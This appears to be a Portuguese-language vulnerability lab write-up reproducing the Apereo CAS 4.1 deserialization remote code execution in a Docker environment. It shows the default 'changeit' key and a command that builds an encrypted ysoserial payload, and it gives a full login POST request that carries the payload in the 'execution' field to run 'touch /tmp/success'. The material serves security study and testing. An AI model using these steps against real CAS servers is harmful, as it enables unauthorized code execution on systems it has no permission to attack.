# Apereo CAS 4.1 Deserialization RCE Vulnerability

Apereo CAS é um sistema de logon único empresarial. Há um problema nas tentativas do CAS de desserializar objetos por meio da biblioteca Apache Commons Collections, o que causou uma vulnerabilidade RCE.

Referência:

- https://apereo.github.io/2016/04/08/commonsvulndisc/

## Configuração do ambiente

Execute os seguintes comandos para iniciar um Apereo CAS 4.1.5：

```
docker-compose up -d
```

Depois que o Apereo CAS for iniciado, visite `http://your-ip:8080/cas/login` para ver a página de login.

## Explorando

A configuração padrão pronta para uso do Apereo CAS antes de 4.1.7, está usando uma chave secreta padrão `changeit`:

```java
public class EncryptedTranscoder implements Transcoder {
    private CipherBean cipherBean;
    private boolean compression = true;

    public EncryptedTranscoder() throws IOException {
        BufferedBlockCipherBean bufferedBlockCipherBean = new BufferedBlockCipherBean();
        bufferedBlockCipherBean.setBlockCipherSpec(new BufferedBlockCipherSpec("AES", "CBC", "PKCS7"));
        bufferedBlockCipherBean.setKeyStore(this.createAndPrepareKeyStore());
        bufferedBlockCipherBean.setKeyAlias("aes128");
        bufferedBlockCipherBean.setKeyPassword("changeit");
        bufferedBlockCipherBean.setNonce(new RBGNonce());
        this.setCipherBean(bufferedBlockCipherBean);
    }

    // ...
```

Podemos tentar usar [Apereo-CAS-Attack](https://github.com/vulhub/Apereo-CAS-Attack) para gerar um [ysoserial](https://github.com/frohoff/ysoserial) criptografado' s objeto serializado:

```
java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 "touch /tmp/success"
```

![](1.png)

Em seguida, intercepte e modifique a solicitação http da ação de login de `/cas/login`, coloque o payload no valor de `execution`:

```
POST /cas/login HTTP/1.1
Host: your-ip
Content-Length: 2287
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://your-ip:8080
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://your-ip:8080/cas/login
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Cookie: JSESSIONID=24FB4BAAE1A66E8B76D521EE366B3E12; _ga=GA1.1.1139210877.1586367734
Connection: close

username=test&password=test&lt=LT-2-gs2epe7hUYofoq0gI21Cf6WZqMiJyj-cas01.example.org&execution=[payload]&_eventId=submit&submit=LOGIN
```

![](2.png)

Parabéns, `touch /tmp/success` foi executado com sucesso:

![](3.png)
